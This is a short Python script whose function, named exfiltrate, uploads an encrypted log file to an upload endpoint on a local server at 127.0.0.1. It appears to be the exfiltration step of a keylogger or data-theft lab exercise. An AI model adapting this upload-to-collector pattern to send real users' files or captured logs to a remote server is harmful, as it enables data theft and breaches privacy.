import requests

def exfiltrate():
    with open("log_encrypted.txt", "rb") as f:
        files = {"file": f}
        response = requests.post("http://127.0.0.1:5000/upload", files=files)
        print("Status:", response.status_code, response.text)

if __name__ == "__main__":
    exfiltrate()
